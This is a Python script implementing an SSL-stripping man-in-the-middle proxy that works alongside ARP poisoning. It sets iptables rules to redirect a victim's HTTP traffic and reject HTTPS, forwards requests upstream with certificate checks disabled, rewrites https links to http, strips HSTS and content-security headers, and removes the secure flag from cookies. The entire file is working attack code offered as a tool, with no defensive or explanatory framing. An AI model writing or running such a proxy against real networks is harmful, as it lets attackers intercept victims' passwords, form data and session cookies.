#!/usr/bin/env python3
"""
SSL Stripping Proxy
Redirects victim's HTTP traffic to a local proxy,
forwards the request as HTTPS, then downgrades the response.
"""

import subprocess
import atexit
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
from bs4 import BeautifulSoup

# Configuration
CONFIG = {
    'VICTIM_IP': None,
    'ATTACKER_IP': None,
    'PROXY_PORT': 8080,
}

# ---------- Setup and Cleanup ----------
def setup_iptables():
    """Redirect HTTP and drop HTTPS using iptables."""
    proxy_port = CONFIG['PROXY_PORT']
    print(f"[*] Redirecting port 80 to local port {proxy_port} and blocking HTTPS...")

    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True)

    # Redirect port 80 to our proxy
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
        "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(proxy_port)
    ], check=True)

    # Block HTTPS (TCP 443) so browser downgrades to HTTP
    subprocess.run([
        "sudo", "iptables", "-A", "FORWARD",
        "-p", "tcp", "--dport", "443",
        "-j", "REJECT", "--reject-with", "tcp-reset"
    ], check=True)

    print("[+] iptables rules set: HTTP redirected, HTTPS blocked.")


def cleanup_iptables():
    """Restore iptables and IP forwarding."""
    proxy_port = CONFIG['PROXY_PORT']
    print("[*] Cleaning up iptables rules...")

    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
        "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(proxy_port)
    ], check=False, capture_output=True)

    subprocess.run([
        "sudo", "iptables", "-D", "FORWARD",
        "-p", "tcp", "--dport", "443",
        "-j", "REJECT", "--reject-with", "tcp-reset"
    ], check=False, capture_output=True)

    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False, capture_output=True)

    print("[+] iptables cleanup done and IP forwarding disabled.")


# ---------- Proxy Handler ----------
class ProxyHandler(BaseHTTPRequestHandler):
    """Intercepts HTTP request → Forwards over HTTPS → Downgrades response to HTTP"""

    def handle_request(self, method):
        if self.client_address[0] == CONFIG['ATTACKER_IP']:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"[!] Ignoring attacker's own request.")
            return

        host = self.headers.get('Host')
        if not host:
            self.send_error(400, "Missing Host header")
            return

        target_url = f"https://{host}{self.path}"
        print(f"[*] Intercepted {method} → {target_url}")

        try:
            headers = dict(self.headers)
            post_data = None

            if method == 'POST':
                content_len = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_len)

            response = requests.request(
                method,
                target_url,
                headers=headers,
                data=post_data,
                verify=False,
                allow_redirects=False
            )

            self.send_response(response.status_code)

            modified_content = response.content
            content_type = response.headers.get('Content-Type', '').lower()

            if 'text/html' in content_type:
                soup = BeautifulSoup(response.text, 'html.parser')
                for tag in soup.find_all(href=True):
                    tag['href'] = tag['href'].replace('https://', 'http://')
                modified_content = str(soup).encode('utf-8')

            for key, value in response.headers.items():
                if key.lower() in ['strict-transport-security', 'content-security-policy', 'content-encoding']:
                    continue
                if key.lower() == 'set-cookie':
                    value = value.replace('; secure', '')
                if key.lower() == 'content-length':
                    self.send_header(key, str(len(modified_content)))
                else:
                    self.send_header(key, value)

            self.end_headers()
            self.wfile.write(modified_content)

        except requests.exceptions.RequestException as e:
            print(f"[!] Error forwarding request: {e}")
            self.send_error(502, f"Proxy Error: {e}")

    def do_GET(self):
        self.handle_request('GET')

    def do_POST(self):
        self.handle_request('POST')


# ---------- Main ----------
class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker):
        CONFIG['VICTIM_IP'] = ip_victim
        CONFIG['ATTACKER_IP'] = ip_attacker
        self.interface = interface
        self.port = CONFIG['PROXY_PORT']

    def strip(self):
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning)

        setup_iptables()
        atexit.register(cleanup_iptables)

        print(f"[*] Starting SSL Stripping proxy on port {self.port}")
        print("[!] Ensure ARP poisoning is active")

        httpd = HTTPServer(('0.0.0.0', self.port), ProxyHandler)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Proxy server interrupted.")
            httpd.server_close()